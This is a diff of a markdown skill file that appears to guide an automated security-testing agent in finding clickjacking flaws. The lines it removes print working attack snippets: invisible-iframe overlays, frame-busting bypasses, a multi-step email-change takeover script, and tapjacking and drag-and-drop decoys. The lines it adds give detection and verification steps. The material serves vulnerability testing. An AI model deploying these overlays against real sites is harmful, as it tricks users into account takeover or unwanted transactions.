@@ -1,4 +1,4 @@
----
+﻿---
 name: clickjacking
 description: "Clickjacking (UI Redressing) attack techniques including frame injection, cookie forcing, and multi-step clickjacking"
 category: specialized
@@ -66,11 +66,6 @@ owaspRefs: ["OWASP Top 10 A04:2021 Insecure Design"]
 
 ### Syntax
 
-```
-Content-Security-Policy: frame-ancestors 'none';           // blocks all framing
-Content-Security-Policy: frame-ancestors 'self';           // same-origin only
-Content-Security-Policy: frame-ancestors https://trusted.com;  // specific origin
-```
 
 ### Bypass Strategy
 
@@ -94,36 +89,19 @@ Content-Security-Policy: frame-ancestors https://trusted.com;  // specific origi
 
 JavaScript-based protection that attempts to break out of iframes:
 
-```javascript
-// Common frame-busting code
-if (self !== top) { top.location = self.location; }
-```
 
 ### Bypass Techniques
 
 **Technique 1: Sandbox Attribute**
 
-```html
-<iframe sandbox="allow-forms allow-scripts" src="https://target.com"></iframe>
-```
 The `sandbox` attribute (without `allow-top-navigation`) prevents the iframe from navigating the top frame. The frame-busting script cannot redirect `top.location`.
 
 **Technique 2: Two-Frame Nesting**
 
-```html
-<!-- Outer frame -->
-<iframe src="https://target.com">
-  <!-- Inner frame loads attacker content that does NOT trigger frame-busting -->
-</iframe>
-```
 If frame-busting checks `self === top` and there is an intermediate frame, the check may pass.
 
 **Technique 3: Overwrite `top.location` Setter**
 
-```javascript
-// In attacker page before iframe loads
-Object.defineProperty(window, 'top', { get: function() { return window; } });
-```
 
 **Technique 4: `about:blank` Origin Trick**
 
@@ -141,36 +119,6 @@ After applying bypass, use `evaluateRendered` to confirm:
 - Interactive elements within the iframe are clickable
 
 ## 7. Iframe Injection — Basic Attack Setup
-
-### Minimal Proof of Concept
-
-```html
-<!DOCTYPE html>
-<html>
-<head>
-  <style>
-    iframe {
-      position: absolute;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      opacity: 0.0001;  /* Nearly invisible */
-      z-index: 2;
-    }
-    .decoy {
-      position: absolute;
-      top: 0; left: 0;
-      z-index: 1;
-      font-size: 24px;
-      padding: 20px;
-    }
-  </style>
-</head>
-<body>
-  <div class="decoy">Click here to claim your prize!</div>
-  <iframe src="https://target.com/settings" sandbox="allow-forms allow-scripts"></iframe>
-</body>
-</html>
-```
 
 ### Overlay Alignment
 
@@ -218,50 +166,9 @@ If the target uses cookies for authentication and the victim is logged in:
 
 Chain multiple clicks across sequential iframes or page loads to perform complex actions.
 
-### Example: Account Takeover Chain
+### Multi-Step Clickjacking
 
-**Step 1**: Click "Change Email" button (iframe overlay #1)
-```html
-<iframe id="step1" src="https://target.com/settings/email" sandbox="allow-forms allow-scripts"></iframe>
-```
-
-**Step 2**: After click, load iframe #2 targeting the email confirmation input
-```html
-<iframe id="step2" src="https://target.com/settings/email/confirm" sandbox="allow-forms allow-scripts"></iframe>
-```
-
-**Step 3**: Load iframe #3 targeting the "Save" or "Confirm" button
-
-### Implementation
-
-```javascript
-const steps = [
-  { overlay: '#change-email-btn', iframe: 'https://target.com/settings/email' },
-  { overlay: '#email-input', iframe: 'https://target.com/settings/email/confirm' },
-  { overlay: '#save-btn', iframe: 'https://target.com/settings/email/complete' }
-];
-
-let currentStep = 0;
-function loadStep(step) {
-  document.getElementById('attacker-overlay').innerHTML = steps[step].overlayHtml;
-  document.getElementById('target-frame').src = steps[step].iframe;
-}
-
-// After each click, load next step
-document.getElementById('target-frame').addEventListener('load', () => {
-  if (currentStep < steps.length - 1) {
-    currentStep++;
-    loadStep(currentStep);
-  }
-});
-```
-
-### Challenges
-
-- Timing: each iframe load introduces latency
-- Session state: the session must remain valid across all steps
-- Browser security: some browsers block rapid sequential iframe navigations
-- Visual alignment: overlay positions must match across different page layouts
+Chain sequential iframe loads to perform multi-step actions (e.g., change email then confirm). Each step depends on session state persisting across navigations, so validate that the session stays valid and overlay positions align across page layouts before claiming feasibility.
 
 ## 10. Drag-and-Drop Clickjacking
 
@@ -269,19 +176,6 @@ document.getElementById('target-frame').addEventListener('load', () => {
 
 The `dragstart`, `drag`, and `drop` events can be triggered across iframes in some browsers.
 
-```html
-<div draggable="true" id="drag-source">
-  Drag me to win a prize!
-</div>
-
-<iframe src="https://target.com/upload" sandbox="allow-scripts"></iframe>
-
-<script>
-document.getElementById('drag-source').addEventListener('dragstart', (e) => {
-  e.dataTransfer.setData('text/plain', 'malicious-payload');
-});
-</script>
-```
 
 ### Use Cases
 
@@ -297,20 +191,6 @@ Hijack the scroll position to align different elements with the user's viewport,
 
 ### Technique
 
-```javascript
-// Override scroll behavior
-window.addEventListener('scroll', (e) => {
-  // Redirect scroll to a hidden iframe
-  document.getElementById('target-frame').contentWindow.scrollBy(0, e.deltaY);
-});
-
-// Or use CSS to create misleading scroll behavior
-.overflow-container {
-  height: 100vh;
-  overflow: hidden;
-  position: relative;
-}
-```
 
 ### Detection
 
@@ -326,28 +206,6 @@ On mobile devices, tapjacking uses touch events instead of click events.
 
 ### Technique
 
-```html
-<style>
-  .touch-overlay {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    z-index: 9999;
-    background: rgba(255,255,255,0.01);  /* Nearly invisible */
-  }
-  .touch-target {
-    position: absolute;
-    /* Position over the iframe's button */
-    top: 300px; left: 50px;
-    width: 200px; height: 60px;
-  }
-</style>
-
-<div class="touch-overlay">
-  <div class="touch-target">Tap to claim reward</div>
-</div>
-<iframe src="https://target.com/settings" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.0001;"></iframe>
-```
 
 ### Mobile-Specific Considerations
 
@@ -361,17 +219,6 @@ On mobile devices, tapjacking uses touch events instead of click events.
 
 ### Automated Detection Flow
 
-```
-1. httpRequest → Fetch target page, capture response headers
-2. parseResponse → Extract X-Frame-Options and CSP frame-ancestors
-3. Classify:
-   ├── Missing both headers → VULNERABLE (proceed to PoC)
-   ├── Has DENY or frame-ancestors 'none' → NOT VULNERABLE (verify with iframe)
-   └── Has SAMEORIGIN or frame-ancestors 'self' → TEST same-origin bypass
-4. evaluateRendered → Load target in iframe, confirm rendering
-5. writeFinding → Document vulnerability with evidence
-6. recordEvidence → Save headers, iframe test result, overlay alignment proof
-```
 
 ### Manual Testing Tools
 
@@ -398,3 +245,24 @@ On mobile devices, tapjacking uses touch events instead of click events.
 - **Always verify** with `evaluateRendered` that the iframe actually loads the target content, not an error page or redirect.
 - **Do not claim** multi-step clickjacking is feasible without testing that session state persists across iframe navigations.
 - **Do not assume** all pages on a domain have the same framing policy — test each endpoint individually.
+
+## Trigger Conditions
+
+Activate on state-changing or sensitive pages (password/email change, fund transfer, settings, OAuth consent, payment) where the response lacks `X-Frame-Options` or a CSP `frame-ancestors` directive, or where those headers are misconfigured/inconsistent across routes. Also trigger for drag-and-drop, scrolljacking, and mobile tapjacking on touch interfaces. Do not trigger when both `X-Frame-Options: DENY` and `frame-ancestors 'none'` are enforced, or on purely static informational pages with no actionable elements.
+
+## Detection Approach
+
+First inspect framing headers per endpoint (some routes omit them while others set them). If `X-Frame-Options` is missing or only `SAMEORIGIN` (and an attacker-controlled subdomain on the same eTLD+1 is feasible), and no enforced `frame-ancestors`, the page is likely frameable. Confirm by actually rendering the target inside an iframe via `evaluateRendered` — headers may be present but unenforced, or absent but compensated by effective frame-busting. Then check `SameSite` on session cookies (captured headers): if `Strict`/`Lax`, cross-site iframes won't carry cookies and impact is limited. Test frame-busting bypasses (sandbox attribute, nested frames, `top.location` setter overwrite) only after confirming the page frames. Assess impact by the state-changing action reachable while the victim is authenticated.
+
+## Pitfalls
+
+- Claiming vulnerability from missing headers alone without rendering the page in an iframe — headers may be ignored or compensated by JS frame-busting.
+- Assuming `ALLOW-FROM` protects — it is deprecated and ignored by modern browsers.
+- Forgetting `SameSite` cookie semantics — cross-site iframes may not send auth cookies, killing the attack.
+- Assuming one endpoint's policy applies to all — test each route individually.
+- Reporting multi-step clickjacking feasible without proving session persistence across iframe navigations.
+- Treating a frame-busting script as effective without testing modern bypasses.
+
+## Verification & Impact
+
+CONFIRMED when `evaluateRendered` shows the target content actually loads inside an iframe (not an error/redirect), overlay events propagate to the target's interactive elements, and — for auth-dependent impact — session cookies are sent (SameSite verified). SUSPECTED when headers are missing but rendering/framing is untested, or cookies are `Strict`/`Lax` — record as candidate. Document impact by the action an attacker could induce (account takeover via email/password change, unwanted consent, fund transfer) and severity scales with the state change reachable while authenticated. Capture the PoC frame setup and rendered proof via `recordEvidence`.
